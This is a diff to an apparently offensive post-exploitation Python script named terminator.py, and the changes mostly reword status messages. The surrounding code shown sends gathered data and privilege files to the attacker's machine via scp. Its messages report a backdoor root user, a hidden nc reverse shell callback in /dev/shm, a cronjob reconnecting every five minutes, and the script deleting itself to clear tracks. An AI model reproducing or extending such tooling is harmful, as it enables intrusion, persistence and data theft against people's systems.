@@ -565,7 +565,7 @@ def cron_make():
 
 # data exfiltration ###############################
 
-# gather target machine data and write to file, scp data files to local machine
+# gather target machine data and write to files for exfiltration
 def extract(username,password,local_ip,local_port):
    # write data to file
    print("\n### exfiltrating data... ###")
@@ -632,7 +632,7 @@ def export(local_ip):
 
    # try to scp files to local machine using inputted username
    try:
-      print("\n### sending data to {}@{}/terminator/scp_output.txt... ###\n+input your local machine root password+".format(u_root,local_ip))
+      print("\n### sending data to {}@{}/terminator/scp_output.txt... ###\n+input your password for local user {}+".format(u_root,local_ip,u_root))
       os.system("scp /tmp/data_exfil.txt /tmp/priv.txt {}@{}:/terminator/".format(u_root,local_ip))
    except:
       print("\n*** error sending files to {}@{}:/terminator/\n*** specified user may not have write permissions in /terminator/ directory\n*** please specify different user or change permissions of /terminator/ on local machine with 'chmod 777 /terminator/".format(u_root,local_ip))
@@ -688,7 +688,7 @@ def clear_tracks(username,password,local_ip,local_port):
    print("\n\n### persistence established with the following ###")
    print("- user {}:{} was added with root privileges".format(username,password))
    print("- nc reverse shell callback implanted at /dev/shm/.data/data_log")
-   print("- cronjob created to execute nc reverse shell callback every 5 minutes to {}:{}".format(local_ip,local_port))
+   print("- cronjob created to execute nc reverse shell callback every 5 minutes to {}:{}\n".format(local_ip,local_port))
 
    # delete terminator.py file
    os.system("rm -f terminator.py")
